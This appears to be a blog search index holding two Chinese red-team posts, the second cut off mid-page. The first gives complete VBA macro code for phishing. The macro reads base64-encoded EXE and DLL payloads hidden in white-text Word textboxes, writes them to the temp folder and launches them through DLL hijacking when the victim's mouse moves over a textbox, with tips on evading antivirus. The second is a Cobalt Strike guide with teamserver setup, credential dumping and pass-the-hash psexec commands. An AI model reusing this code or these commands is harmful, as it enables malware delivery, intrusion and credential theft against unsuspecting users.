<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>钓鱼与社工系列之office宏</title>
      <link href="/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/"/>
      <url>/2020/12/05/diao-yu-yu-she-gong-xi-lie-zhi-office-hong/</url>
      
        <content type="html"><![CDATA[<h1 id="钓鱼与社工系列之office宏"><a href="#钓鱼与社工系列之office宏" class="headerlink" title="钓鱼与社工系列之office宏"></a>钓鱼与社工系列之office宏</h1><h2 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h2><p>​    根据多次项目实战中发现，office宏仍然是最高的成功率，在静默钓鱼中也是最不容易触发人员的警觉。因为大部分员工即使有安全意识，也是不运行陌生的exe程序，但是对于word文档则没有足够的安全意识，认为word文档都是安全的。正是基于此心理状态，office宏在钓鱼中仍然占据重要成分。</p><p>​    当然，现在office在国内市场中其实占据并不多，越来越多人用wps了。那么这种情况下office宏肯定是无效了，下篇文章会针对该情景分析如何钓鱼。</p><h2 id="0x02-宏代码流程及免杀"><a href="#0x02-宏代码流程及免杀" class="headerlink" title="0x02 宏代码流程及免杀"></a>0x02 宏代码流程及免杀</h2><p>​    网上有很多项目及文章是如何实现宏免杀的效果，之所以要宏免杀大部分原因都是代码是实现运行宏的时候就直接远程上线到rat上。例如调用powershell或者远程下载等等代码所用到的api或者函数，都被杀软盯着。那么换个思路，我们即不调用powershell执行敏感函数，也不远程下载文件，我们所做要的是<strong>释放文件并通过dll劫持实现上线</strong>。</p><p>​    释放文件其实也是个技术活，经过测试，<strong>能否释放文件成功主要看你的文件是不是静态免杀</strong>，如果文件静态免杀，那么就能够成功释放。因为这就是个正常的功能，杀软不可能拦截你释放安全的文件，不然就影响一些职业的正常办公了。而我们用的是dll劫持的方法，白名单程序肯定是安全的文件，<strong>那么就是我们的恶意dll文件如何实现静态免杀了</strong>。如何让dll文件静态免杀的方法很多，网上也有很多项目，这块内容不在该文章里，以后会详细讲解。</p><p>​    上段说了释放文件，而文件也都静态免杀了。那么还有一个要注意的地方，那就是dll劫持的程序保存在word文件哪里？首先我们得将dll劫持程序已二进制形式读取出来，然后base64编码后得到了一串字符串，只要释放的时候重新base64解码并已二进制形式写入到磁盘里，这样就能够释放出dll劫持程序了。<strong>那么重点就是该base64字符串存放在哪里？千万别放在宏代码里，很容易被杀，最好的规避杀软的方法就是将base64字符串放到word正文里的文本框等控件里</strong>。然后宏代码去读取文本框里的base64字符串，再解码写入磁盘里并运行白程序实现上线。这样通过该方法就能够实现了宏免杀。</p><p>​    最后一步就是如何触发宏了，千万不要使用打开word文件就触发宏的方法，很容易被杀软拦截。我常用的方法就是<strong>弄一个很大的文本框放在第一页，然后当目标的鼠标移动到文本框时就触发宏</strong>。这样的方法既能有效规避杀软，还能在目标不知情的情况下触发了宏！</p><p>​    <strong>总结：寻找一个dll劫持的白程序，做一个静态免杀的dll文件，将所有文件以二进制形式读取出来并base64编码后存放到word的文本框里。宏代码功能读取文本框里的字符串并解码写入磁盘，然后运行白程序即可免杀上线！</strong></p><h2 id="0x03-宏代码"><a href="#0x03-宏代码" class="headerlink" title="0x03 宏代码"></a>0x03 宏代码</h2><h3 id="0x03-1-读取文件并base64编码"><a href="#0x03-1-读取文件并base64编码" class="headerlink" title="0x03-1 读取文件并base64编码"></a>0x03-1 读取文件并base64编码</h3><p>先使用下面的代码将白程序和dll文件base64编码得到字符串</p><pre><code>Sub WriteBinary(FileName, Buf)  Dim I, aBuf, Size, bStream  Size = UBound(Buf): ReDim aBuf(Size \ 2)  For I = 0 To Size - 1 Step 2      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))  Next  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))  aBuf = Join(aBuf, &quot;&quot;)  Set bStream = CreateObject(&quot;ADODB.Stream&quot;)  bStream.Type = 1: bStream.Open  With CreateObject(&quot;ADODB.Stream&quot;)    .Type = 2: .Open: .WriteText aBuf    .Position = 2: .CopyTo bStream: .Close  End With  bStream.SaveToFile FileName, 2: bStream.Close  Set bStream = NothingEnd SubFunction Base64Encode(str() As Byte) As String                                  &#39;Base64 编码    On Error GoTo over                                                          &#39;排错    Dim Buf() As Byte, length As Long, mods As Long    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;    mods = (UBound(str) + 1) Mod 3   &#39;除以3的余数    length = UBound(str) + 1 - mods    ReDim Buf(length / 3 * 4 + IIf(mods &lt;&gt; 0, 4, 0) - 1)    Dim I As Long    For I = 0 To length - 1 Step 3        Buf(I / 3 * 4) = (str(I) And &amp;HFC) / &amp;H4        Buf(I / 3 * 4 + 1) = (str(I) And &amp;H3) * &amp;H10 + (str(I + 1) And &amp;HF0) / &amp;H10        Buf(I / 3 * 4 + 2) = (str(I + 1) And &amp;HF) * &amp;H4 + (str(I + 2) And &amp;HC0) / &amp;H40        Buf(I / 3 * 4 + 3) = str(I + 2) And &amp;H3F    Next    If mods = 1 Then        Buf(length / 3 * 4) = (str(length) And &amp;HFC) / &amp;H4        Buf(length / 3 * 4 + 1) = (str(length) And &amp;H3) * &amp;H10        Buf(length / 3 * 4 + 2) = 64        Buf(length / 3 * 4 + 3) = 64    ElseIf mods = 2 Then        Buf(length / 3 * 4) = (str(length) And &amp;HFC) / &amp;H4        Buf(length / 3 * 4 + 1) = (str(length) And &amp;H3) * &amp;H10 + (str(length + 1) And &amp;HF0) / &amp;H10        Buf(length / 3 * 4 + 2) = (str(length + 1) And &amp;HF) * &amp;H4        Buf(length / 3 * 4 + 3) = 64    End If    For I = 0 To UBound(Buf)        Base64Encode = Base64Encode + Mid(B64_CHAR_DICT, Buf(I) + 1, 1)    Nextover:End Function&#39;VB Base64 解码/解密函数：Function Base64Decode(B64 As String) As Byte()                                  &#39;Base64 解码    On Error GoTo over                                                          &#39;排错    Dim OutStr() As Byte, I As Long, j As Long    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;    If InStr(1, B64, &quot;=&quot;) &lt;&gt; 0 Then B64 = Left(B64, InStr(1, B64, &quot;=&quot;) - 1)     &#39;判断Base64真实长度,除去补位    Dim length As Long, mods As Long    mods = Len(B64) Mod 4    length = Len(B64) - mods    ReDim OutStr(length / 4 * 3 - 1 + Switch(mods = 0, 0, mods = 2, 1, mods = 3, 2))    For I = 1 To length Step 4        Dim Buf(3) As Byte        For j = 0 To 3            Buf(j) = InStr(1, B64_CHAR_DICT, Mid(B64, I + j, 1)) - 1            &#39;根据字符的位置取得索引值        Next        OutStr((I - 1) / 4 * 3) = Buf(0) * &amp;H4 + (Buf(1) And &amp;H30) / &amp;H10        OutStr((I - 1) / 4 * 3 + 1) = (Buf(1) And &amp;HF) * &amp;H10 + (Buf(2) And &amp;H3C) / &amp;H4        OutStr((I - 1) / 4 * 3 + 2) = (Buf(2) And &amp;H3) * &amp;H40 + Buf(3)    Next    If mods = 2 Then        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16    ElseIf mods = 3 Then        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16        OutStr(length / 4 * 3 + 1) = ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;HF) * &amp;H10 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 3, 1)) - 1) And &amp;H3C) / &amp;H4    End If    Base64Decode = OutStr                                                       &#39;读取解码结果over:End FunctionSub test2()    Dim iFN As Integer    Dim sPath As String    Dim bFileSize As Long    Dim sResult As String    Dim arr() As Byte       &#39; 字节数组    Dim arra() As Byte       &#39; 字节数组    Dim infile, outfile, infileBase As String    infile = &quot;C:\Windows\Temp\123.exe&quot;    outfile = &quot;c:\windows\temp\1.exe&quot;    iFN = VBA.FreeFile    bFileSize = VBA.FileLen(infile)    &#39;Debug.Print bFileSize    Open infile For Binary Access Read As iFN    arr = InputB(bFileSize, iFN)        &#39;读取字节流    infileBase = Base64Encode(arr())    &#39;Debug.Print infileBase    Dim FSO    Set FSO = CreateObject(&quot;Scripting.FileSystemObject&quot;)    Set OutPutFile = FSO.OpenTextFile(&quot;C:\windows\temp\test.txt&quot;, 2, True)    OutPutFile.Write (infileBase)    OutPutFile.Close    Set FSO = Nothing    &#39;Dim infileBaseExe As String    &#39;infileBaseExe = Range(&quot;J22&quot;).Value    &#39;infileBaseExe = infileBaseExe + Range(&quot;J23&quot;).Value    &#39;arra = Base64Decode(infileBase)    &#39;WriteBinary outfile, arraEnd Sub</code></pre><h3 id="0x03-2-office宏上线代码"><a href="#0x03-2-office宏上线代码" class="headerlink" title="0x03-2 office宏上线代码"></a>0x03-2 office宏上线代码</h3><p>从文本框中读取base64内容，解码后写入到c:\windows\temp\目录下，当用户鼠标移动或点击到文本框中，触发宏执行木马</p><pre><code>Private Declare PtrSafe Sub Sleep Lib &quot;kernel32&quot; (ByVal Milliseconds As LongPtr)Private Declare PtrSafe Function GetProcAddress Lib &quot;kernel32&quot; (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtrPrivate Declare PtrSafe Function LoadLibrary Lib &quot;kernel32&quot; Alias &quot;LoadLibraryA&quot; (ByVal lpLibFileName As String) As LongPtrPrivate Declare PtrSafe Function VirtualProtect Lib &quot;kernel32&quot; (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProtect As Long, lpflOldProtect As Long) As LongPrivate Declare PtrSafe Sub ByteSwapper Lib &quot;kernel32.dll&quot; Alias &quot;RtlFillMemory&quot; (Destination As Any, ByVal length As Long, ByVal Fill As Byte)Private Declare PtrSafe Sub Peek Lib &quot;msvcrt&quot; Alias &quot;memcpy&quot; (ByRef pDest As Any, ByRef pSource As Any, ByVal nBytes As Long)Private Declare PtrSafe Function CreateProcess Lib &quot;kernel32&quot; Alias &quot;CreateProcessA&quot; (ByVal lpApplicationName As String, ByVal lpCommandLine As String, lpProcessAttributes As Any, lpThreadAttributes As Any, ByVal bInheritHandles As Long, ByVal dwCreationFlags As Long, lpEnvironment As Any, ByVal lpCurrentDriectory As String, lpStartupInfo As STARTUPINFO, lpProcessInformation As PROCESS_INFORMATION) As LongPrivate Declare PtrSafe Function OpenProcess Lib &quot;kernel32.dll&quot; (ByVal dwAccess As Long, ByVal fInherit As Integer, ByVal hObject As Long) As LongPrivate Declare PtrSafe Function TerminateProcess Lib &quot;kernel32&quot; (ByVal hProcess As Long, ByVal uExitCode As Long) As LongPrivate Declare PtrSafe Function CloseHandle Lib &quot;kernel32&quot; (ByVal hObject As Long) As LongPrivate Type PROCESS_INFORMATION    hProcess As Long    hThread As Long    dwProcessId As Long    dwThreadId As LongEnd TypePrivate Type STARTUPINFO    cb As Long    lpReserved As String    lpDesktop As String    lpTitle As String    dwX As Long    dwY As Long    dwXSize As Long    dwYSize As Long    dwXCountChars As Long    dwYCountChars As Long    dwFillAttribute As Long    dwFlags As Long    wShowWindow As Integer    cbReserved2 As Integer    lpReserved2 As Long    hStdInput As Long    hStdOutput As Long    hStdError As LongEnd TypeConst CREATE_NO_WINDOW = &amp;H8000000Const CREATE_NEW_CONSOLE = &amp;H10Function fileExist(filePath)    Dim fso    Set fso = CreateObject(&quot;Scripting.FileSystemObject&quot;)    If fso.fileExists(filePath) Then        fileExist = True    Else        fileExist = False    End If    Set fso = NothingEnd FunctionFunction dddddd(B64 As String) As Byte()    On Error GoTo over    Dim OutStr() As Byte, i As Long, j As Long    Const B64_CHAR_DICT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;    If InStr(1, B64, &quot;=&quot;) &lt;&gt; 0 Then B64 = Left(B64, InStr(1, B64, &quot;=&quot;) - 1)    Dim length As Long, mods As Long    mods = Len(B64) Mod 4    length = Len(B64) - mods    ReDim OutStr(length / 4 * 3 - 1 + Switch(mods = 0, 0, mods = 2, 1, mods = 3, 2))    For i = 1 To length Step 4        Dim buf(3) As Byte        For j = 0 To 3            buf(j) = InStr(1, B64_CHAR_DICT, Mid(B64, i + j, 1)) - 1        Next        OutStr((i - 1) / 4 * 3) = buf(0) * &amp;H4 + (buf(1) And &amp;H30) / &amp;H10        OutStr((i - 1) / 4 * 3 + 1) = (buf(1) And &amp;HF) * &amp;H10 + (buf(2) And &amp;H3C) / &amp;H4        OutStr((i - 1) / 4 * 3 + 2) = (buf(2) And &amp;H3) * &amp;H40 + buf(3)    Next    If mods = 2 Then        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16    ElseIf mods = 3 Then        OutStr(length / 4 * 3) = (InStr(1, B64_CHAR_DICT, Mid(B64, length + 1, 1)) - 1) * &amp;H4 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;H30) / 16        OutStr(length / 4 * 3 + 1) = ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 2, 1)) - 1) And &amp;HF) * &amp;H10 + ((InStr(1, B64_CHAR_DICT, Mid(B64, length + 3, 1)) - 1) And &amp;H3C) / &amp;H4    End If    dddddd = OutStrover:End FunctionFunction runCommand(comando)    Dim pInfo As PROCESS_INFORMATION    Dim sInfo As STARTUPINFO    Dim sNull As String    Dim lSuccess As Long    Dim lRetValue As Long    lSuccess = CreateProcess(sNull, comando, ByVal 0&amp;, ByVal 0&amp;, 1&amp;, CREATE_NO_WINDOW, ByVal 0&amp;, sNull, sInfo, pInfo)    lRetValue = CloseHandle(pInfo.hThread)    lRetValue = CloseHandle(pInfo.hProcess)End FunctionFunction WriteBinary(FileName, buf)  Dim i, aBuf, Size, bStream  Size = UBound(buf): ReDim aBuf(Size \ 2)  For i = 0 To Size - 1 Step 2      aBuf(i \ 2) = ChrW(buf(i + 1) * 256 + buf(i))  Next  If i = Size Then aBuf(i \ 2) = ChrW(buf(i))  aBuf = Join(aBuf, &quot;&quot;)  Set bStream = CreateObject(&quot;ADODB.Stream&quot;)  bStream.Type = 1: bStream.Open  With CreateObject(&quot;ADODB.Stream&quot;)    .Type = 2: .Open: .WriteText aBuf    .Position = 2: .CopyTo bStream: .Close  End With  bStream.SaveToFile FileName, 2: bStream.Close  Set bStream = NothingEnd FunctionFunction releaseFile(path As String, conte As String)    hwminiArra = dddddd(conte)    WriteBinary path, hwminiArraEnd FunctionFunction start()    Dim filePath As String    filePath = &quot;C:\Windows\temp\aaaaaaa.exe&quot;    If Not fileExist(filePath) Then        releaseFile &quot;C:\Windows\temp\aaaaaaa.exe&quot;, Replace(ActiveDocument.Shapes(1).TextFrame.TextRange, Chr(13), Empty)        releaseFile &quot;C:\Windows\temp\aaaaaaaaaaa.dll&quot;, Replace(ActiveDocument.Shapes(2).TextFrame.TextRange, Chr(13), Empty)    End If    runCommand (filePath)End FunctionPrivate Sub TextBox2_MouseDown(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)    Static i As Integer    i = i + 1    If i &lt; 3 Then        start    End IfEnd SubPrivate Sub TextBox2_MouseMove(ByVal Button As Integer, ByVal Shift As Integer, ByVal X As Single, ByVal Y As Single)    Static i As Integer    i = i + 1    If i &lt; 3 Then        start    End IfEnd Sub</code></pre><h2 id="0x04-隐藏文本框"><a href="#0x04-隐藏文本框" class="headerlink" title="0x04 隐藏文本框"></a>0x04 隐藏文本框</h2><p>将dll劫持的程序base64编码后存放在文本框里</p><p><img src="/img/officeMacro/2e0174b7-ec47-49aa-adda-9c570b8bd365.png" alt="img"></p><p>文本框的线条设置为无颜色</p><p><img src="/img/officeMacro/fffbd65a-61d4-4bee-bce7-90965bfa080b.png" alt="img"></p><p><img src="/img/officeMacro/0fbf519d-64fe-4ce4-a18a-53366dbf2c4d.png" alt="img"></p><p><img src="/img/officeMacro/e0732e74-e9c6-4384-b5de-8aa843b202c4.png" alt="img"></p><p>将base64字符串的字体设置为白色，</p><p><img src="/img/officeMacro/bb2c62f3-45fe-4b71-a40c-b74a7cd94c19.png" alt="img"></p><p>将最后一页的最上方空白行删掉，那么这时候就看不到文本框了</p><p><img src="/img/officeMacro/ce27f099-b5f2-4e73-942e-f9ccd3a5378a.png" alt="img"></p><p>在首页将触发宏的文本框拉到最大，然后话术诱导目标将鼠标移动或点击文本框</p><p><img src="/img/officeMacro/2c98a350-80c7-45b9-b453-4cc6f089bf65.png" alt="img"></p><h2 id="0x05-宏代码加密"><a href="#0x05-宏代码加密" class="headerlink" title="0x05 宏代码加密"></a>0x05 宏代码加密</h2><p>​    为了防止宏代码被分析，可以设置密码。当然这仅仅只是防不懂的人，懂的人还是会用工具解密的。</p><p><img src="/img/officeMacro/34bfdf24-af9c-48e4-b118-cabb0d5056c0.png" alt="img"></p><p><img src="/img/officeMacro/968c0feb-3be6-4d28-8127-428dba5f747e.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 钓鱼与社工 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 钓鱼与社工系列之office宏 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CobalStrike扫盲</title>
      <link href="/2020/11/27/cobalstrike-sao-mang/"/>
      <url>/2020/11/27/cobalstrike-sao-mang/</url>
      
        <content type="html"><![CDATA[<h1 id="CobalStrike"><a href="#CobalStrike" class="headerlink" title="CobalStrike"></a>CobalStrike</h1><pre><code>安装、运行、介绍上线+命令执行取密码socks4 代理扩展脚本-cnahash传递（端口扫描）中转上线（不出网的情况下上线）和msf联动屏幕截图，键盘记录ssh上线</code></pre><h2 id="0x01-安装、运行、介绍"><a href="#0x01-安装、运行、介绍" class="headerlink" title="0x01 安装、运行、介绍"></a>0x01 安装、运行、介绍</h2><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><pre><code>apt install default-jdk将cs文件夹复制到Linux下chmod 777 teamserver</code></pre><p><img src="/img/CobalStrikeLiteracy/0.4295879606896589.png" alt="img"></p><h3 id="运行"><a href="#运行" class="headerlink" title="运行"></a>运行</h3><pre><code>./teamserver &lt;host&gt; &lt;password&gt; [/path/to/c2.profile] [YYYY-MM-DD]&lt;host&gt; 必需参数 团队服务器IP&lt;password&gt; 必需参数 连接服务器的密码[/path/to/c2.profile] 可选参数 指定C2通信配置文件，体现其强大的扩展性[YYYY-MM-DD] 可选参数 所有payload的终止时间# 启动Team Server./teamserver 192.168.183.147 123456 # 设置强密码，否则容易被爆破，参考附录默认连接端口为50050，如果你想修改端口只需修改teamserver文件</code></pre><p><img src="/img/CobalStrikeLiteracy/0.030918049820894786.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.2975981257563896.png" alt="img"></p><h3 id="参数详情"><a href="#参数详情" class="headerlink" title="参数详情"></a>参数详情</h3><p>Cobalt Strike</p><pre><code>New Connection # 新建连接，支持连接多个服务器端Preferences # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录Visualization # 主要展示输出结果的视图VPN Interfaces # 设置VPN接口Listenrs # 创建监听器Script Manager # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等Close # 退出连接</code></pre><p><img src="/img/CobalStrikeLiteracy/0.13801954727640234.png" alt="img"></p><p>View</p><pre><code>Applications # 显示受害主机的应用信息Credentials # 显示所有以获取的受害主机的凭证，如hashdump、MimikatzDownloads # 查看已下载文件Event Log # 主机上线记录以及团队协作聊天记录Keystrokes # 查看键盘记录结果Proxy Pivots # 查看代理模块Screenshots # 查看所有屏幕截图Script Console # 加载第三方脚本以增强功能 Targets # 显示所有受害主机Web Log # 所有Web服务的日志</code></pre><p><img src="/img/CobalStrikeLiteracy/0.16414763602254645.png" alt="img"></p><p>Attacks</p><pre><code>PackagesHTML Application # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件MS Office Macro # 生成office宏病毒文件Payload Generator # 生成各种语言版本的payloadUSB/CD AutoPlay # 生成利用自动播放运行的木马文件Windows Dropper # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)Windows Executable # 生成可执行exe木马Windows Executable(Stageless) # 生成无状态的可执行exe木马</code></pre><p><img src="/img/CobalStrikeLiteracy/0.39729118995260604.png" alt="img"></p><p>Web Drive-by</p><pre><code>Manage # 对开启的web服务进行管理Clone Site # 克隆网站，可以记录受害者提交的数据Host File # 提供文件下载，可以选择Mime类型Scripted Web Delivery # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery Signed Applet Attack # 使用java自签名的程序进行钓鱼攻击(该方法已过时)Smart Applet Attack # 自动检测java版本并进行攻击，针对Java 1.6.0_45以下以及Java 1.7.0_21以下版本(该方法已过时)System Profiler # 用来获取系统信息，如系统版本，Flash版本，浏览器版本等Spear Phish # 鱼叉钓鱼邮件</code></pre><p><img src="/img/CobalStrikeLiteracy/0.07192938054993915.png" alt="img"></p><p>Reporting</p><pre><code>Activity Report # 活动报告Hosts Report # 主机报告Indicators of Compromise # IOC报告：包括C2配置文件的流量分析、域名、IP和上传文件的MD5 hashesSessions Report # 会话报告Social Engineering Report # 社会工程报告：包括鱼叉钓鱼邮件及点击记录Tactics, Techniques, and Procedures # 战术技术及相关程序报告：包括行动对应的每种战术的检测策略和缓解策略Reset Data # 重置数据Export Data # 导出数据，导出.tsv文件格式</code></pre><p><img src="/img/CobalStrikeLiteracy/0.4228559550173042.png" alt="img"></p><p>Help</p><pre><code>Homepage # 官方主页Support # 技术支持Arsenal # 开发者System information # 版本信息About # 关于</code></pre><p><img src="/img/CobalStrikeLiteracy/0.40007668547560965.png" alt="img"></p><p>工具栏</p><pre><code>1.新建连接2.断开当前连接3.监听器4.改变视图为Pivot Graph(视图列表)5.改变视图为Session Table(会话列表)6.改变视图为Target Table(目标列表)7.显示所有以获取的受害主机的凭证8.查看已下载文件9.查看键盘记录结果10.查看屏幕截图11.生成无状态的可执行exe木马12.使用java自签名的程序进行钓鱼攻击13.生成office宏病毒文件14.为payload提供web服务以便下载和执行15.提供文件下载，可以选择Mime类型16.管理Cobalt Strike上运行的web服务17.帮助18.关于</code></pre><p><img src="/img/CobalStrikeLiteracy/0.6533318592180974.png" alt="img"></p><h2 id="0x02-上线"><a href="#0x02-上线" class="headerlink" title="0x02 上线"></a>0x02 上线</h2><h3 id="脚本上线"><a href="#脚本上线" class="headerlink" title="脚本上线"></a>脚本上线</h3><p><img src="/img/CobalStrikeLiteracy/3d1d80e5-2da3-42ae-868f-9f0c68725a9d.png" alt="img"></p><p>创建监听器</p><p><img src="/img/CobalStrikeLiteracy/e481d734-6f7a-4c56-9a4a-3608208e9376.png" alt="img"></p><p>选择上线脚本</p><p><img src="/img/CobalStrikeLiteracy/89e1e655-b2e6-468b-a6e3-f59dacc4e055.png" alt="img"></p><p>生成上线脚本</p><p><img src="/img/CobalStrikeLiteracy/8e8bc7c7-5dea-4f71-8be5-59e1351520e4.png" alt="img"></p><p>目标机器执行</p><p><img src="/img/CobalStrikeLiteracy/5c1a89e8-ce77-454c-97e0-6521b7979e72.png" alt="img"></p><p>成功上线</p><p><img src="/img/CobalStrikeLiteracy/2c4d3ecc-9418-4003-8514-7b1dfbd4a193.png" alt="img"></p><p>dll上线-针对windows2003系统</p><p><img src="/img/CobalStrikeLiteracy/95d70b3a-5d25-4c6e-8fb4-d2d8a43a529b.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/4868ce1b-0b75-4409-a2c2-1d36f17105e0.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/ed747050-b9be-4bb8-9284-d92b950f48dd.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/66116645-f061-4062-9e13-ad20a2182c7e.png" alt="img"></p><p>改变心跳时间</p><p><img src="/img/CobalStrikeLiteracy/a48189f6-04ea-4d5e-b86e-8b909ea04a9a.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/f1c8e5dc-6d7b-4d59-8dbc-e94185775f87.png" alt="img"></p><p>执行命令</p><p>shell command</p><p><img src="/img/CobalStrikeLiteracy/58148862-d11c-405e-a99d-abddec9cce3e.png" alt="img"></p><p>派生</p><p><img src="/img/CobalStrikeLiteracy/fb60c9c4-d253-453e-8360-cd544bad1f63.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/c10b4b34-c719-4e38-9340-ede16c643f3b.png" alt="img"></p><p>成功又出现一个</p><p><img src="/img/CobalStrikeLiteracy/64282938-2f15-44e4-abd2-84a0d7328c28.png" alt="img"></p><p>查看文件</p><p><img src="/img/CobalStrikeLiteracy/adf1e010-7cd6-4aa8-a4d8-28339918171d.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/9a33a714-0b38-454a-8fe5-3c150960656f.png" alt="img"></p><p>上传文件</p><p><img src="/img/CobalStrikeLiteracy/e50edd1f-b21d-4b82-9d68-5ff4b48498dd.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/fc09befa-bcea-40b6-978f-49a93673d39e.png" alt="img"></p><p>下载文件</p><p><img src="/img/CobalStrikeLiteracy/412755e7-5519-4ed0-9088-92075b5b63c8.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/6feea086-714c-41d8-bacd-9b3f0e538292.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/b1c66fbf-4d06-4868-9c97-e10e3631f234.png" alt="img"></p><h2 id="0x03-取密码"><a href="#0x03-取密码" class="headerlink" title="0x03 取密码"></a>0x03 取密码</h2><p>内存hash</p><p><img src="/img/CobalStrikeLiteracy/f5a584e4-1eb3-4d2f-ba96-e25e2ff23f1d.png" alt="img"></p><p>注册表的hash</p><p><img src="/img/CobalStrikeLiteracy/be307192-274e-4e46-ac0f-07922005f148.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/6433ab39-1806-4bfb-87b3-c5b10709e7a8.png" alt="img"></p><h2 id="0x04-socks4-a-代理"><a href="#0x04-socks4-a-代理" class="headerlink" title="0x04 socks4 a 代理"></a>0x04 socks4 a 代理</h2><p><img src="/img/CobalStrikeLiteracy/8ccb0736-f712-4914-af01-67894b82c2a8.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/463ada81-1267-40ab-8ceb-616331f07474.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/60c0f8e1-6fcc-4c54-a108-73f60fd08073.png" alt="img"></p><p>成功代理</p><p><img src="/img/CobalStrikeLiteracy/35fa1d93-9476-453e-ae77-46461c1589b2.png" alt="img"></p><h2 id="0x05-扩展脚本-cna"><a href="#0x05-扩展脚本-cna" class="headerlink" title="0x05 扩展脚本-cna"></a>0x05 扩展脚本-cna</h2><p>Ladon</p><pre><code>https://github.com/k8gege/Ladon</code></pre><p><img src="/img/CobalStrikeLiteracy/c6a8adbd-73c3-41cf-8fc1-c91557d2ab5f.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/b5ed6eff-49af-4e24-a90b-b5aaf607fe4b.png" alt="img"></p><p>成功加载</p><p><img src="/img/CobalStrikeLiteracy/ab281c7f-3bf1-4f10-91ac-2fc87336a32b.png" alt="img"></p><p>运行Ladon</p><p><img src="/img/CobalStrikeLiteracy/a4888c5b-eda9-43d0-885d-7bf0c9af13ed.png" alt="img"></p><pre><code>Ladon 192.168.11.0/24 OnlinePC      存活扫描Ladon 192.168.11.0/24 PortScan      端口扫描Ladon 192.168.11.0/24 WebScan       web扫描Ladon 192.168.11.0/24 MS17010       17010扫描</code></pre><p>还有很多功能，自行研究</p><h2 id="0x06-hash传递"><a href="#0x06-hash传递" class="headerlink" title="0x06 hash传递"></a>0x06 hash传递</h2><p>psexec pth传递单个上线</p><pre><code>pth 域名\用户名 密码ntlmpsexec ip\域机器 ADMIN$ 监听的名字pth domain\administrator 88966b179aaaaaa67870a34eafpsexec DC02 ADMIN$ a                            a是监听的名字pth .\administrator 5a09d1400b366aaaaa2344a3d07375psexec 10.192.204.5 ADMIN$ 1111                    1111是监听</code></pre><p>成功上线（前提是能够出网）</p><p><img src="/img/CobalStrikeLiteracy/4101640.png" alt="img"></p><p>使用相同的账号密码批量上线</p><p>\1. 端口扫描判断存活</p><p>\2. 选中存活的主机，批量登录-使用psexec_psh</p><p><img src="/img/CobalStrikeLiteracy/0.39369171800484487.png" alt="img"></p><p><img src="/img/CobalStrikeLiteracy/0.5840731309741612.png" alt="img"></p><p>扫描结果</p><p><img src="/img/CobalStrikeLiteracy/4036484.png" alt="img"></p><p>选中存活机器，右键login-&gt;psexec(psh)</p><p><img src="/img/CobalStrikeLiteracy/0.3387576826443788.png" alt="img"></p><p>如果是域用户，则domain框填写域名，本地用户，则domain框随便填写</p><p>session选择当前控制的机器</p><p><img src="/img/CobalStrikeLiteracy/4167546.png" alt="img"></p><p>launch，就会对存活主机hash传递并上线</p><p><img src="/img/CobalStrikeLiteracy/0.15842965852393573.png" alt="img"></p><p>成功和失败的结果</p><p><img src="/img/CobalStrikeLiteracy/0.2904655007953677.png" alt="img"></p><h2 id="0x07-中转上线"><a href="#0x07-中转上线" class="headerlink" title="0x07 中转上线"></a>0x07 中转上线</h2><p>内网不出网的机器中转上线</p><p>当前机器开启一个监听</p><p><img src="/img/CobalStrikeLiteracy/0.6096430050494017.png" alt="img"></p><p>Name随便填写一个，其他的默认即可</p><p><img 